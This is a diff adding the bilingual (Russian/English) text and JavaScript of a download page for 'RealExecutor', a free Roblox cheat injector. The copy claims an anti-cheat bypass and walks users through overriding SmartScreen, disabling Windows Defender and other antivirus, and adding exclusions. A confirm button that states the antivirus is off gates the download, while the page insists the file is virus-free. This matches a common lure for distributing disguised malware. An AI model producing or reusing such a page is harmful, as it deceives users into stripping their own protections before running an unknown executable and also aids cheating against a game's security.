+    stat1:"скачиваний", stat2:"версия", stat3:"FPS даже на слабых ПК",
+    feat_kicker:"ВОЗМОЖНОСТИ", feat_title:"Всё для комфортной игры",
+    feat_sub:"Всё, за что любят топовые инжекторы — уже внутри, бесплатно и без ограничений.",
+    f1d:"Мгновенный инжект и стабильное исполнение любых Lua-скриптов: от простых читов до сложных кастомных GUI.",
+    f2d:"Встроенная библиотека из 500+ популярных скриптов: Infinite Yield, Dex и многое другое — запускай любой скрипт в один клик, без поиска по форумам.",
+    f3d:"Глубокая оптимизация рендера. Стабильные 240+ FPS даже на слабых ПК.",
+    f4d:"Никаких ключей, сокращателей ссылок и ожидания: скачал — запустил — играешь. Полный доступ сразу после установки.",
+    f5t:"Автообновление",
+    f5d:"RealExecutor сам подстраивается под обновления Roblox: патчи выходят в течение 24 часов после апдейта игры.",
+    f6d:"Продвинутый обход античита Hyperion/Byfron: инжект остаётся незаметным для системы, а твой аккаунт — под защитой.",
+    inst_kicker:"УСТАНОВКА", inst_title:"Три шага — и ты в игре",
+    s1t:"Скачай RealExecutor", s1d:"Нажми «Скачать для Windows» и сохрани файл .exe на компьютер.",
+    s2t:"Запусти установку", s2d:"Открой скачанный файл Real.exe. Если SmartScreen предупредит — «Подробнее» → «Выполнить в любом случае».",
+    s3t:"Играй", s3d:"Запусти Roblox, нажми Attach в RealExecutor и выполняй любые скрипты через редактор (Ctrl+E) или Script Hub.",
+    dl_kicker:"СКАЧАТЬ", dl_title:"RealExecutor v4.2",
+    dl_text:"Прямая ссылка уже работает — жми кнопку и забирай RealExecutor бесплатно. Приятной игры!",
+    file_meta:"Real.exe · Windows x64",
+    req1:"Windows 10 / 11 (x64)", req2:"4 ГБ ОЗУ", req3:"VC++ Redist — в комплекте", req4:"~120 МБ на диске",
+    toast_soon:"Прямая ссылка будет добавлена чуть позже — оставайся на сайте!",
+    footer_text:"RealExecutor — неофициальный инструмент. Проект не связан с Roblox Corporation. Roblox — торговая марка Roblox Corporation.",
+    footer_copy:"© 2025 RealExecutor. Сделано игроками для игроков.",
+    av_title:"Выключи антивирус перед скачиванием",
+    av_text:"Это инжектор: он внедряет <b>DLL в процесс Roblox</b>. Поэтому Windows Defender и сторонние антивирусы могут ругаться, блокировать установку или удалять файлы.",
+    av_l1:"Временно <b>отключи антивирус</b> (Windows Defender, Avast, Kaspersky и т.д.) на время скачивания и установки.",
+    av_l2:"Добавь папку инжектора в <b>исключения антивируса</b>, чтобы он не удалил DLL после запуска.",
+    av_l3:"Если браузер или система блокируют загрузку — <b>разреши сохранение файла</b>.",
+    av_confirm:"Я выключил антивирус — скачать",
+    av_cancel:"Отмена",
+    av_note:"Инжектор не содержит вирусов, но антивирусы реагируют на внедрение DLL и обход защиты Roblox.",
+    avb_title:"Антивирус может ругаться на файл",
+    avb_text:"Real.exe внедряет DLL в процесс Roblox — Windows Defender и другие антивирусы могут блокировать загрузку или удалять файл. Это нормально: добавьте его в исключения."
+  },
+  en: {
+    title:"RealExecutor — Roblox Executor — Download for Windows",
+    nav_home:"Home", nav_features:"Features", nav_install:"Setup",
+    btn_download_sm:"Download", btn_download:"Download for Windows", btn_details:"Learn more",
+    pill:"EXECUTOR · FOR ROBLOX",
+    hero_about:"RealExecutor is a fast and stable script executor for Roblox: run any Lua scripts, use the built-in Script Hub and get an edge — no keys, no payments. Just download and play.",
+    hero_sub:"Free · Windows 10/11 · .exe file",
+    stat1:"downloads", stat2:"version", stat3:"FPS even on weak PCs",
+    feat_kicker:"FEATURES", feat_title:"Everything for a comfortable game",
+    feat_sub:"Everything people love about top executors — already included, free and unlimited.",
+    f1d:"Instant injection and stable execution of any Lua scripts — from simple cheats to complex custom GUIs.",
+    f2d:"A built-in library of 500+ popular scripts: Infinite Yield, Dex and much more — launch any script in one click.",
+    f3d:"Deep render optimization. A stable 240+ FPS even on weak PCs.",
+    f4d:"No keys, no link shorteners, no waiting: download — run — play. Full access right after installation.",
+    f5t:"Auto-Update",
+    f5d:"RealExecutor adapts to Roblox updates by itself: patches ship within 24 hours after each game update.",
+    f6d:"Advanced Hyperion/Byfron bypass: the injection stays invisible to the system and your account stays safe.",
+    inst_kicker:"SETUP", inst_title:"Three steps — and you're in",
+    s1t:"Download RealExecutor", s1d:"Click “Download for Windows” and save the .exe file to your PC.",
+    s2t:"Run the installer", s2d:"Open the downloaded Real.exe file. If SmartScreen warns — “More info” → “Run anyway”.",
+    s3t:"Play", s3d:"Launch Roblox, press Attach in RealExecutor and run any scripts via the editor (Ctrl+E) or the Script Hub.",
+    dl_kicker:"DOWNLOAD", dl_title:"RealExecutor v4.2",
+    dl_text:"The direct link is already live — press the button and grab RealExecutor for free. Enjoy!",
+    file_meta:"Real.exe · Windows x64",
+    req1:"Windows 10 / 11 (x64)", req2:"4 GB RAM", req3:"VC++ Redist — included", req4:"~120 MB disk space",
+    toast_soon:"The direct link will be added a bit later — stay tuned!",
+    footer_text:"RealExecutor is an unofficial tool. Not affiliated with Roblox Corporation. Roblox is a trademark of Roblox Corporation.",
+    footer_copy:"© 2025 RealExecutor. Made by players, for players.",
+    av_title:"Disable your antivirus before downloading",
+    av_text:"This is an injector: it injects a <b>DLL into the Roblox process</b>. That's why Windows Defender and third-party antivirus software may flag it, block the install or delete files.",
+    av_l1:"<b>Disable your antivirus</b> (Windows Defender, Avast, Kaspersky, etc.) while downloading and installing.",
+    av_l2:"Add the executor folder to your antivirus <b>exclusions</b> so the DLL isn't removed after launch.",
+    av_l3:"If your browser or system blocks the download — <b>allow saving the file</b>.",
+    av_confirm:"I've disabled my antivirus — download",
+    av_cancel:"Cancel",
+    av_note:"The executor contains no viruses, but antiviruses react to DLL injection and Roblox protection bypass.",
+    avb_title:"Your antivirus may flag this file",
+    avb_text:"Real.exe injects a DLL into the Roblox process — Windows Defender and other antiviruses may block the download or delete the file. That's expected: add it to your exclusions."
+  }
+};
+
+let lang = 'ru';
+function setLang(l){
+  lang = l;
+  document.documentElement.lang = l;
+  document.title = I18N[l].title;
+  document.querySelectorAll('[data-i18n]').forEach(el=>{
+    const k = el.dataset.i18n;
+    if(I18N[l][k] != null) el.innerHTML = I18N[l][k];
+  });
+  document.getElementById('langLabel').textContent = l.toUpperCase();
+  document.querySelectorAll('.lang-menu li').forEach(li=>
+    li.classList.toggle('active', li.dataset.lang === l));
+  try{ localStorage.setItem('re_lang', l); }catch(e){}
+}
+
+/* ---------------- Логика скачивания с модалкой ---------------- */
+const dlButtons = document.querySelectorAll('[data-dl]');
+const avModal = document.getElementById('avModal');
+let pendingDownload = false;
+
+/* вешаем href */
+if (DOWNLOAD_URL) {
+  dlButtons.forEach(a => { a.href = DOWNLOAD_URL; a.setAttribute('download',''); });
+}
+
+/* показываем модалку перед скачиванием */
+dlButtons.forEach(a => a.addEventListener('click', e => {
+  if (!DOWNLOAD_URL) {
+    e.preventDefault();
+    showToast(I18N[lang].toast_soon);
+    return;
+  }
+  e.preventDefault();
+  pendingDownload = true;
+  avModal.classList.add('show');
+}));
+
+function closeModal(){
+  avModal.classList.remove('show');
+  pendingDownload = false;
+}
+
+/* плашка-предупреждение тоже открывает окно с подробностями */
+const avBanner = document.getElementById('avBanner');
+function openAvModal(){
+  if (!DOWNLOAD_URL) { showToast(I18N[lang].toast_soon); return; }
+  pendingDownload = true;
+  avModal.classList.add('show');
+}
+avBanner.addEventListener('click', openAvModal);
+avBanner.addEventListener('keydown', e => {
+  if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openAvModal(); }
+});
+
+document.getElementById('avCancel').addEventListener('click', closeModal);
+avModal.addEventListener('click', e => { if (e.target === avModal) closeModal(); });
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+
+document.getElementById('avConfirm').addEventListener('click', () => {
+  if (pendingDownload && DOWNLOAD_URL) {
+    /* запускаем скачивание */
+    const tmp = document.createElement('a');
+    tmp.href = DOWNLOAD_URL;
+    tmp.setAttribute('download', '');
+    document.body.appendChild(tmp);
+    tmp.click();
+    document.body.removeChild(tmp);
+  }
+  closeModal();
+});
+
+/* ---------------- Тост ---------------- */
+let toastTimer;
+function showToast(msg){
+  document.getElementById('toastText').textContent = msg;
+  const t = document.getElementById('toast');
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(()=>t.classList.remove('show'), 3200);
+}
+
+/* ---------------- Счётчики ---------------- */
+function animateCount(el){
+  const target = parseInt(el.dataset.count, 10);
+  const suffix = el.dataset.suffix || '';
+  const locale = lang === 'ru' ? 'ru-RU' : 'en-US';
+  const dur = 1300, t0 = performance.now();
+  (function tick(t){
+    const p = Math.min((t - t0)/dur, 1);
+    const eased = 1 - Math.pow(1 - p, 3);
+    el.textContent = Math.round(target * eased).toLocaleString(locale) + suffix;
+    if (p < 1) requestAnimationFrame(tick);
+  })(performance.now());
+}
+
+/* ---------------- Появление при скролле ---------------- */
+const io = new IntersectionObserver(es => es.forEach(en => {
+  if (en.isIntersecting){ en.target.classList.add('in'); io.unobserve(en.target); }
+}), {threshold:.15});
+document.querySelectorAll('.reveal').forEach(el => io.observe(el));
+
+const co = new IntersectionObserver(es => es.forEach(en => {
+  if (en.isIntersecting){ animateCount(en.target); co.unobserve(en.target); }
+}), {threshold:.4});
+document.querySelectorAll('.count').forEach(el => co.observe(el));
+
+/* ---------------- Язык / меню ---------------- */
+const langEl = document.getElementById('lang');
+document.getElementById('langBtn').addEventListener('click', e => {
+  e.stopPropagation(); langEl.classList.toggle('open');
+});
+document.querySelectorAll('.lang-menu li').forEach(li => li.addEventListener('click', () => {
+  setLang(li.dataset.lang); langEl.classList.remove('open');
+}));
+document.addEventListener('click', () => langEl.classList.remove('open'));
+
+document.getElementById('burger').addEventListener('click', () =>
+  document.body.classList.toggle('nav-open'));
+document.querySelectorAll('.site-nav a').forEach(a => a.addEventListener('click', () =>
+  document.body.classList.remove('nav-open')));
+
+/* старт */
+let saved = null;
+try{ saved = localStorage.getItem('re_lang'); }catch(e){}
+setLang(saved && I18N[saved] ? saved : 'ru');
+</script>
+</body>
+</html>
